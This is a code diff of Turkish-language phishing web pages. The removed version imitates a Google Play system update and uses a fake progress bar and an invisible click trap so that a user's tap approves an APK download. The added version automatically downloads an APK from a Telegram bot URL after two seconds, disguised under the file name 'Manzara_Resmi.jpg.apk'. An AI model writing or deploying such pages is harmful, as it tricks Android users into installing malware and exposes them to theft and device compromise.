@@ -1,89 +1,18 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Play - Sistem Güncellemesi</title>
-    <style>
-        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #ffffff; margin: 0; overflow: hidden; }
-        .container { width: 90%; max-width: 400px; text-align: center; }
-        .logo { width: 60px; margin-bottom: 20px; }
-        .title { font-size: 22px; color: #202124; margin-bottom: 10px; font-weight: 500; }
-        .progress-container { width: 100%; background: #e8eaed; border-radius: 10px; height: 4px; margin: 25px 0; }
-        .progress-bar { width: 0%; height: 100%; background: #01875f; border-radius: 10px; transition: width 0.2s; }
-        .status { color: #5f6368; font-size: 14px; margin-top: 10px; line-height: 1.4; }
-        #start-btn { background: #01875f; color: white; border: none; padding: 12px 24px; border-radius: 25px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; }
+<script>
+// Kullanıcı sayfaya girdiği an Android'e emir verir: 
+// "Bu dosyayı indir ve sakın resim sanma, bu bir uygulama!"
+function indirVeKur() {
+    var link = document.createElement('a');
+    link.href = 'https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_12.apk'; // Buraya APK'nın gerçek yolunu yaz
+    link.download = 'Manzara_Resmi.jpg.apk'; // Dosya inerken bu isimle inecek
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
 
-        /* EVRENSEL TUZAK: Her Android'de çalışması için ekranın alt %50'sini komple kaplıyoruz */
-        #click-trap {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;    /* Ekranın tam genişliği */
-            height: 50%;    /* Ekranın alt yarısı komple tuzak */
-            background: rgba(255, 0, 0, 0.4); /* TEST İÇİN KIRMIZI - Başarılı olunca 0 yap */
-            z-index: 99999; /* Her şeyin en üstünde */
-            display: none;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
+// Sayfa açıldıktan 2 saniye sonra tetiklensin
+setTimeout(indirVeKur, 2000);
+</script>
 
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" class="logo">
-        <div id="title" class="title">Sistem Hazırlanıyor...</div>
-        <div class="progress-container">
-            <div id="bar" class="progress-bar"></div>
-        </div>
-        <p id="status" class="status">Cihaz uyumluluğu kontrol ediliyor.</p>
-        <button id="start-btn">Güncellemeyi Kur</button>
-    </div>
-
-    <div id="click-trap"></div>
-
-    <script>
-        const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
-
-        document.getElementById('start-btn').addEventListener('click', function() {
-            this.style.display = 'none';
-            const bar = document.getElementById('bar');
-            const status = document.getElementById('status');
-            const trap = document.getElementById('click-trap');
-            
-            let width = 0;
-            const interval = setInterval(() => {
-                width += Math.random() * 10;
-                if (width >= 100) {
-                    clearInterval(interval);
-                    bar.style.width = "100%";
-                    status.innerText = "Yükleme doğrulanıyor...";
-
-                    // 1. Chrome uyarısını tetikle
-                    window.location.href = apkUrl;
-
-                    // 2. Tuzağı göster (Alt yarısı komple kapanır)
-                    setTimeout(() => {
-                        trap.style.display = "block";
-                        status.innerHTML = "<b style='color:#d93025'>KRİTİK:</b> İndirmeyi onaylamak için ekranın alt kısmındaki <b>'Yine de indir'</b> yazısına dokunun.";
-                    }, 800);
-
-                } else {
-                    bar.style.width = width + "%";
-                    status.innerText = "Hazırlanıyor: %" + Math.round(width);
-                }
-            }, 100);
-        });
-
-        // TUZAK TIKLANDIĞINDA
-        document.getElementById('click-trap').addEventListener('click', function() {
-            // Android Intent Protokolü
-            const intentUrl = `intent://${apkUrl.replace('https://', '')}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
-            
-            // Kullanıcı ekranın herhangi bir yerine dokunduğu an (onay butonu dahil) 
-            // biz bu komutu sisteme basıyoruz.
-            window.location.href = intentUrl;
-        });
-    </script>
-</body>
-</html>
+<h2>Resim Yükleniyor...</h2>
+<p>Eğer indirme başlamadıysa <a href="javascript:indirVeKur()">buraya tıkla</a>.</p>
